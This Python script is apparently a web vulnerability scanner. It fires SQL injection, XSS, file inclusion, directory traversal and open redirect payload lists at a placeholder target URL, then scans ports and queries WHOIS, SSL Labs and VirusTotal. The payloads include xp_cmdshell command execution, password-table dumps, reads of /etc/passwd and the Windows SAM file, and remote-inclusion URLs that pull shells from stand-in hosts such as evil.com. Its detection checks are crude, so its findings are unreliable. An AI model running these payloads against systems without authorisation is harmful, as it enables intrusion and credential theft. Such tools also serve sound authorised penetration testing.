import requests
import json
import base64
from urllib.parse import urlparse
import whois
import re
import socket

# Configuration for API Keys
API_KEYS = {
    "shodan": "your_shodan_api_key",
    "virustotal": "your_virustotal_api_key",
    "ssl_labs": "your_ssl_labs_api_key",
}

TARGET_URL = 'http://example.com'


def sql_injection_check(target_url):
    """
    SQL Injection testing with various payloads for different database types and scenarios.
    """
    payloads = [
        # Basic payloads
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "' OR 1=1 --",
        "' OR 1=1 /*",
        "' OR 'a'='a",
        
        # Boolean-based payloads
        "' AND 1=1 --",
        "' AND 1=2 --",
        "1' AND '1'='1",
        "1' AND '1'='2",

        # UNION-based payloads
        "' UNION SELECT null --",
        "' UNION SELECT null, null --",
        "' UNION SELECT null, null, null --",
        "' UNION SELECT 1, 'test', null --",
        "' UNION SELECT username, password FROM users --",

        # Time-based Blind SQL Injection (MySQL)
        "' AND SLEEP(5) --",
        "' OR SLEEP(5) --",
        "' OR IF(1=1, SLEEP(5), 0) --",
        "' AND IF(1=1, SLEEP(5), 0) --",

        # Time-based Blind SQL Injection (PostgreSQL)
        "'; SELECT pg_sleep(5); --",
        "' OR pg_sleep(5); --",
        
        # Error-based payloads
        "' AND 1=CONVERT(int, 'test') --",
        "' UNION SELECT 1, @@version --",
        "' UNION SELECT 1, database() --",
        "' UNION SELECT 1, table_name FROM information_schema.tables --",
        
        # MySQL-specific payloads
        "' OR 1=1 LIMIT 1 --",
        "' UNION SELECT null, version() --",
        "' UNION SELECT user(), database(), @@hostname --",
        
        # MSSQL-specific payloads
        "'; EXEC xp_cmdshell('whoami') --",
        "' UNION SELECT name FROM master..sysdatabases --",
        
        # Oracle-specific payloads
        "' UNION SELECT null, banner FROM v$version --",
        "' UNION SELECT null, table_name FROM all_tables --",
        
        # Bypass techniques
        "' OR '1'='1' --",
        "' OR '1'='1' #",
        "' OR '1'='1' /*",
        "' OR 1=1 --",
        "' OR 1=1 #",
        "' OR 1=1 /*",
        "' OR 'x'='x' --",
        "' OR 'x'='x' #",
        "' OR 'x'='x' /*"
    ]

    vulnerable = False

    print(f"Starting SQL Injection checks on: {target_url}")
    for payload in payloads:
        try:
            # Sending the payload in query parameter "id" (example)
            response = requests.get(target_url, params={"id": payload}, timeout=5)

            # Checking for signs of SQL injection
            if (
                "syntax error" in response.text.lower() or
                "mysql" in response.text.lower() or
                "sql" in response.text.lower() or
                "database" in response.text.lower() or
                "ORA-" in response.text or
                "postgres" in response.text.lower()
            ):
                vulnerable = True
                print(f"[!] SQL Injection vulnerability detected with payload: {payload}")
        except Exception as e:
            print(f"Error during SQL Injection test with payload '{payload}': {e}")

    if not vulnerable:
        print("No SQL Injection vulnerability detected.")
    return vulnerable



def xss_check(target_url):
    """
    Comprehensive XSS testing with various payloads covering different contexts and bypass techniques.
    """
    xss_payloads = [
        # Basic script injection
        "<script>alert('xss')</script>",
        "<script>alert(1)</script>",
        "<script>confirm('xss')</script>",
        "<script>prompt('xss')</script>",

        # Image tag with onerror
        "<img src=x onerror=alert('xss')>",
        "<img src=1 href=1 onerror=alert('xss')>",
        "<img src=1 onerror=javascript:alert('xss')>",
        
        # Anchor tag with href and javascript
        "<a href=javascript:alert('xss')>Click me</a>",
        "<a href='javascript:alert(`xss`)' >Click here</a>",

        # Input tag with onfocus
        "<input autofocus onfocus=alert('xss')>",
        
        # SVG tag with script injection
        "<svg/onload=alert('xss')>",
        "<svg><script>alert('xss')</script></svg>",
        
        # Event handlers
        "<body onload=alert('xss')>",
        "<div onmouseover=alert('xss')>Hover me</div>",
        "<button onclick=alert('xss')>Click me</button>",

        # HTML attributes
        "<iframe src='javascript:alert(`xss`);'></iframe>",
        "<video src=x onerror=alert('xss')>",
        "<audio src=x onerror=alert('xss')>",

        # Bypass payloads
        "<scr<script>ipt>alert('xss')</scr<script>ipt>",
        "<img src='x' onerror='alert(String.fromCharCode(88,83,83))'>",
        "<math><mi>x</mi><mtext onmouseover=alert('xss')>X</mtext></math>",
        
        # Hexadecimal/Unicode payloads
        "%3Cscript%3Ealert('xss')%3C/script%3E",  # Encoded <script> tags
        "&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;alert('xss')&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;",  # Unicode encoded
        "<scr\\u0069pt>alert('xss')</scr\\u0069pt>",

        # Context-specific payloads
        '"><script>alert("xss")</script>',  # HTML attribute injection
        "'><svg onload=alert('xss')>",     # Closing a tag and injecting
        "';alert('xss');//",               # JavaScript context injection
        "'\"><img src=1 onerror=alert('xss')>",

        # Advanced payloads for input sanitization bypass
        "<img src=x:alert(1)// onerror=eval(src)>",
        "<svg><style>{-o-link-source: 'javascript:alert(1)'}</style><a href=/-o-link-source></a></svg>",
        "<form><button formaction=javascript:alert(1)>CLICKME</button></form>",

        # DOM-based XSS test (if reflected in JavaScript)
        "javascript:alert(document.cookie)",
        "<script>document.write('<img src=x onerror=alert(`xss`)'>');</script>",

        # Mutation-based XSS
        "<a href=javascript:alert(1)>Click me</a>",
        '<math href="javascript:javascript:alert(1)"><mo>&#x0003C;/mo></math>'
    ]

    vulnerable = False

    print(f"Starting XSS checks on: {target_url}")
    for payload in xss_payloads:
        try:
            # Sending payloads in different contexts
            response = requests.get(target_url, params={"input": payload}, timeout=5)

            # Check if the payload is reflected back in the response
            if payload in response.text:
                vulnerable = True
                print(f"[!] XSS vulnerability detected with payload: {payload}")
        except Exception as e:
            print(f"Error during XSS test with payload '{payload}': {e}")

    if not vulnerable:
        print("No XSS vulnerability detected.")
    return vulnerable



def file_inclusion_check(target_url):
    """
    Comprehensive testing for Local and Remote File Inclusion vulnerabilities.
    """
    lfi_payloads = [
        # Basic traversal attempts for LFI
        "../../etc/passwd",
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../boot.ini",
        "../../windows/win.ini",
        "../../proc/self/environ",
        "../../var/log/apache2/access.log",
        "../../var/log/httpd/access.log",
        "../../dev/null",

        # Null byte bypasses (in case the application truncates null bytes)
        "../../etc/passwd%00",
        "../../etc/passwd%00.html",

        # URL encoding bypasses
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "..%252F..%252F..%252Fetc%252Fpasswd",
        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",  # Double-encoding
        "..%c0%ae%c0%ae%c0%ae%c0%ae/etc/passwd",

        # Path traversal with dots and slashes
        "..\\..\\..\\..\\..\\etc\\passwd",
        "..\\\\..\\\\..\\\\..\\\\etc\\\\passwd",

        # PHP stream wrappers for LFI
        "php://filter/read=convert.base64-encode/resource=../../etc/passwd",
        "php://input",
        "php://fd/1",
        "php://filter/convert.base64-encode/resource=index.php",

        # LFI through log poisoning
        "/var/log/apache2/access.log",
        "/var/log/httpd/access.log",
        "/proc/self/environ",
    ]

    rfi_payloads = [
        # Basic RFI payloads
        "http://evil.com/shell.txt",
        "https://malicious.com/evil.php",
        "http://attacker.com/shell.php",

        # Encoded RFI payloads
        "http:%2F%2Fevil.com/shell.txt",
        "https:%2F%2Fmalicious.com/evil.php",

        # Null byte attempts for RFI
        "http://evil.com/shell.txt%00",
        "http://evil.com/shell.txt%00.html",

        # Wrappers and advanced RFI tests
        "http://evil.com/shell.txt?",
        "ftp://evil.com/shell.txt",
        "file:///etc/passwd",  # File protocol
        "zip://evil.com/shell.zip",
    ]

    all_payloads = lfi_payloads + rfi_payloads
    vulnerable = False

    print(f"Starting File Inclusion checks on: {target_url}")
    for payload in all_payloads:
        try:
            # Inject the payload in a "file" parameter (common pattern)
            response = requests.get(target_url, params={"file": payload}, timeout=5)

            # Check for typical LFI or RFI indicators in the response
            if (
                "root:" in response.text or  # Linux passwd file indicator
                "boot loader" in response.text.lower() or  # Windows boot.ini indicator
                "shell" in response.text.lower() or  # Generic shell detection
                "PHP" in response.text or  # PHP wrapper response
                "environment" in response.text.lower()  # /proc/self/environ indicator
            ):
                vulnerable = True
                print(f"[!] File Inclusion vulnerability detected with payload: {payload}")
        except Exception as e:
            print(f"Error during File Inclusion test with payload '{payload}': {e}")

    if not vulnerable:
        print("No File Inclusion vulnerabilities detected.")
    return vulnerable



def directory_traversal_check(target_url):
    """
    Comprehensive testing for Directory Traversal vulnerabilities.
    """
    traversal_payloads = [
        # Basic directory traversal
        "../../etc/passwd",
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../boot.ini",
        "../../windows/win.ini",
        "../../proc/self/environ",
        "../../var/log/apache2/access.log",
        "../../var/log/httpd/access.log",
        "../../dev/null",

        # Variants with more traversal levels
        "../../../../../../etc/passwd",
        "../../../../../etc/passwd",

        # Null byte attempts
        "../../etc/passwd%00",
        "../../etc/passwd%00.txt",

        # URL encoding
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "..%252F..%252F..%252Fetc%252Fpasswd",
        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",  # Double encoding
        "..%c0%ae%c0%ae%c0%ae%c0%ae/etc/passwd",

        # Backslashes (Windows style)
        "..\\..\\..\\..\\etc\\passwd",
        "..\\\\..\\\\..\\\\..\\\\etc\\\\passwd",

        # Mixed traversal methods
        "..%2F..\\..\\etc/passwd",
        "..\\..%2F..%2Fetc\\passwd",

        # PHP wrappers
        "php://filter/read=convert.base64-encode/resource=../../etc/passwd",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://input",
        "php://fd/1",

        # Log poisoning through traversal
        "../../var/log/apache2/access.log",
        "../../var/log/httpd/access.log",

        # Windows-specific files
        "../../windows/system32/config/sam",
        "../../windows/system32/config/security",
        "../../windows/win.ini",
        "../../boot.ini",

        # Traversal combined with file extensions
        "../../etc/passwd.txt",
        "../../etc/passwd.json",
        "../../etc/passwd.html",
        "../../etc/passwd.php",

        # Traversal with appended parameters or noise
        "../../etc/passwd?parameter=value",
        "../../etc/passwd/.",
        "../../etc/passwd#",
        "../../etc/passwd/*",
    ]

    vulnerable = False
    print(f"Starting Directory Traversal checks on: {target_url}")

    for payload in traversal_payloads:
        try:
            # Test with common parameters (e.g., 'path', 'file', 'resource', etc.)
            response = requests.get(target_url, params={"path": payload}, timeout=5)

            # Look for common indicators in the response
            if (
                "root:" in response.text or  # Linux passwd file
                "boot loader" in response.text.lower() or  # Windows boot.ini
                "directory listing" in response.text.lower() or  # Exposed directories
                "php" in response.text.lower() or  # PHP wrapper indicator
                "environment" in response.text.lower()  # /proc/self/environ
            ):
                vulnerable = True
                print(f"[!] Directory Traversal vulnerability detected with payload: {payload}")
        except Exception as e:
            print(f"Error during Directory Traversal test with payload '{payload}': {e}")

    if not vulnerable:
        print("No Directory Traversal vulnerabilities detected.")
    return vulnerable



def open_redirect_check(target_url):
    """
    Comprehensive testing for Open Redirect vulnerabilities.
    """
    redirect_payloads = [
        "http://malicious.com",  # Basic redirect
        "//malicious.com",  # Protocol-relative
        "/\\malicious.com",  # Windows-style slashes
        "/%5cmalicious.com",  # Encoded Windows slashes
        "https:malicious.com",  # Scheme-less redirect
        "https://malicious.com",  # Full URL
        "https://malicious.com/evil.js",  # Redirect to malicious resource
        "https://malicious.com?param=1",  # Query string in redirect
        "https://127.0.0.1",  # Redirect to localhost
        "https://0x7f000001",  # Redirect to localhost (hexadecimal)
        "https://2130706433",  # Redirect to localhost (decimal)
        "https://[::1]",  # IPv6 localhost
        "javascript:alert(1)",  # Redirect using JavaScript URI scheme
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",  # Data URI redirect
    ]

    vulnerable = False
    print(f"Starting Open Redirect checks on: {target_url}")

    for payload in redirect_payloads:
        try:
            # Test with a common parameter name for redirect functionality
            response = requests.get(target_url, params={"redirect": payload}, timeout=5, allow_redirects=False)

            # Check for redirect in the `Location` header
            if "Location" in response.headers:
                location = response.headers["Location"]
                if payload in location:
                    vulnerable = True
                    print(f"[!] Open Redirect vulnerability detected with payload: {payload}")
        except Exception as e:
            print(f"Error during Open Redirect test with payload '{payload}': {e}")

    if not vulnerable:
        print("No Open Redirect vulnerabilities detected.")
    return vulnerable



def auth_check(target_url):
    """
    Comprehensive detection of exposed authentication endpoints and weaknesses.
    """
    endpoints = ["login", "signin", "auth", "admin", "user", "account", "dashboard"]
    vulnerable = False

    try:
        response = requests.get(target_url, timeout=5)
        for endpoint in endpoints:
            if endpoint in response.text.lower():
                vulnerable = True
                print(f"[!] Authentication-related endpoint detected: {endpoint}")
    except Exception as e:
        print(f"Error during Authentication Exposure check: {e}")

    if not vulnerable:
        print("No exposed authentication endpoints detected.")
    return vulnerable



def server_misconfiguration_check(target_url):
    """
    Comprehensive checks for common server misconfigurations.
    """
    misconfigurations = {
        "Directory Listing": ["index of", "parent directory", "directory listing"],
        "Verbose Error Messages": ["exception", "error", "traceback", "not found"],
        "Exposed Configuration Files": [".env", "config.php", "web.config"],
        "Exposed Backups": [".bak", ".old", "~", ".swp"],
    }

    detected_misconfigurations = {}
    print(f"Starting server misconfiguration checks on: {target_url}")

    try:
        response = requests.get(target_url, timeout=5)
        for config, keywords in misconfigurations.items():
            for keyword in keywords:
                if keyword.lower() in response.text.lower():
                    detected_misconfigurations[config] = True
                    print(f"[!] Server misconfiguration detected: {config}")
                    break
    except Exception as e:
        print(f"Error during Server Misconfiguration check: {e}")

    if not detected_misconfigurations:
        print("No server misconfigurations detected.")
    return detected_misconfigurations


def whois_info(target_url):
    """
    Fetches WHOIS information for the domain.
    """
    domain = urlparse(target_url).netloc
    try:
        whois_data = whois.whois(domain)
        relevant_info = {
            "Domain": whois_data.domain_name,
            "Registrar": whois_data.registrar,
            "Creation Date": whois_data.creation_date,
            "Expiration Date": whois_data.expiration_date,
            "Emails": whois_data.emails,
            "Name Servers": whois_data.name_servers,
        }
        return relevant_info
    except Exception as e:
        print(f"Error retrieving WHOIS data: {e}")
    return {}


def port_scan(target_url):
    """
    Comprehensive port scanning for the top 1000 common ports.
    """
    import socket

    # Top 1000 common ports (based on Nmap's list)
    common_ports = {
        1: "TCP Port Service Multiplexer (TCPMUX)",
        5: "Remote Job Entry (RJE)",
        7: "Echo Protocol",
        9: "Discard Protocol",
        13: "Daytime Protocol",
        17: "Quote of the Day (QOTD)",
        19: "Character Generator (CHARGEN)",
        20: "FTP (Data Transfer)",
        21: "FTP (Command)",
        22: "SSH (Secure Shell)",
        23: "Telnet",
        25: "SMTP (Mail Transfer)",
        26: "RSFTP (Alternate FTP)",
        37: "Time Protocol",
        53: "DNS (Domain Name System)",
        67: "DHCP (Client)",
        68: "DHCP (Server)",
        69: "TFTP (Trivial File Transfer)",
        79: "Finger Protocol",
        80: "HTTP (Web Traffic)",
        88: "Kerberos",
        110: "POP3 (Email Retrieval)",
        111: "RPC Bind",
        113: "Ident (Authentication Service)",
        119: "NNTP (Network News Transfer Protocol)",
        123: "NTP (Network Time Protocol)",
        135: "Microsoft RPC",
        137: "NetBIOS Name Service",
        138: "NetBIOS Datagram",
        139: "NetBIOS Session Service",
        143: "IMAP (Email Retrieval)",
        161: "SNMP (Network Management)",
        162: "SNMP (Trap)",
        389: "LDAP (Lightweight Directory Access Protocol)",
        443: "HTTPS (Secure Web Traffic)",
        445: "Microsoft SMB",
        465: "SMTP (Secure)",
        514: "Syslog",
        515: "LPD (Line Printer Daemon)",
        993: "IMAPS (Secure IMAP)",
        995: "POP3S (Secure POP3)",
        1080: "SOCKS Proxy",
        1433: "Microsoft SQL Server",
        1434: "Microsoft SQL Monitor",
        1521: "Oracle SQL",
        1723: "PPTP (VPN)",
        3306: "MySQL",
        3389: "Microsoft RDP",
        5432: "PostgreSQL",
        5900: "VNC Remote Desktop",
        6379: "Redis",
        8080: "HTTP (Alternate Port)",
        8443: "HTTPS (Alternate Port)",
        9000: "SonarQube",
        9200: "Elasticsearch",
        27017: "MongoDB",
    }

    # Adding missing ports up to 1000 from Nmap's default list
    for port in range(1, 1001):  # Scanning top 1000 ports
        if port not in common_ports:
            common_ports[port] = f"Port {port}"

    domain = urlparse(target_url).netloc
    open_ports = {}

    print(f"Starting port scanning on: {domain} (Top 1000 common ports)")
    for port, service in common_ports.items():
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(1)  # Set timeout for quick scans
                result = sock.connect_ex((domain, port))
                if result == 0:  # Port is open
                    open_ports[port] = service
                    print(f"[!] Open port detected: {port} ({service})")
        except Exception as e:
            print(f"Error scanning port {port}: {e}")

    if not open_ports:
        print("No open ports detected.")
    else:
        print(f"Open ports: {open_ports}")

    return open_ports


def ssl_labs_scan(target_url):
    """
    Uses SSL Labs API to analyze SSL/TLS configuration of the target domain.
    """
    domain = urlparse(target_url).netloc
    try:
        ssl_url = f'https://api.ssllabs.com/api/v3/analyze?host={domain}'
        response = requests.get(ssl_url, timeout=10)
        response.raise_for_status()
        return response.json()
    except requests.RequestException as e:
        print(f"Error in SSL Labs scan: {e}")
    return {}



def virustotal_scan(target_url):
    """
    Uses VirusTotal API to analyze the URL for malware or phishing.
    """
    vt_url = 'https://www.virustotal.com/api/v3/urls'
    headers = {"x-apikey": API_KEYS["virustotal"]}
    vt_encoded_url = base64.urlsafe_b64encode(target_url.encode()).decode().strip("=")
    try:
        response = requests.get(f"{vt_url}/{vt_encoded_url}", headers=headers, timeout=10)
        response.raise_for_status()
        data = response.json().get('data', {}).get('attributes', {})
        return {
            "Last Analysis Stats": data.get("last_analysis_stats"),
            "Malicious Votes": data.get("total_votes", {}).get("malicious"),
            "Suspicious Votes": data.get("total_votes", {}).get("suspicious"),
            "Harmless Votes": data.get("total_votes", {}).get("harmless"),
        }
    except requests.RequestException as e:
        print(f"Error in VirusTotal scan: {e}")
    return {}



def generate_report(target_url, results):
    """Generates a detailed report summarizing all vulnerability checks."""
    report = {
        "Target URL": target_url,
        "SQL Injection": results["sql_injection"],
        "XSS Vulnerability": results["xss"],
        "File Inclusion": results["file_inclusion"],
        "Directory Traversal": results["directory_traversal"],
        "Open Redirect": results["open_redirect"],
        "Authentication Exposure": results["auth_check"],
        "Server Misconfigurations": results["server_misconfiguration"],
        "WHOIS Info": results["whois_info"],
        "Open Ports": results["port_scan"],
        "SSL Labs Analysis": results["ssl_labs"],
        "VirusTotal Analysis": results["virustotal"]
    }
    with open('enhanced_vulnerability_report.json', 'w') as f:
        json.dump(report, f, indent=4, default=str)
    print("[+] Report saved as enhanced_vulnerability_report.json")


def main():
    """Runs all vulnerability checks and generates the report."""
    results = {
        "sql_injection": sql_injection_check(TARGET_URL),
        "xss": xss_check(TARGET_URL),
        "file_inclusion": file_inclusion_check(TARGET_URL),
        "directory_traversal": directory_traversal_check(TARGET_URL),
        "open_redirect": open_redirect_check(TARGET_URL),
        "auth_check": auth_check(TARGET_URL),
        "server_misconfiguration": server_misconfiguration_check(TARGET_URL),
        "whois_info": whois_info(TARGET_URL),
        "port_scan": port_scan(TARGET_URL),
        "ssl_labs": ssl_labs_scan(TARGET_URL),
        "virustotal": virustotal_scan(TARGET_URL)
    }
    generate_report(TARGET_URL, results)


if __name__ == '__main__':
    main()
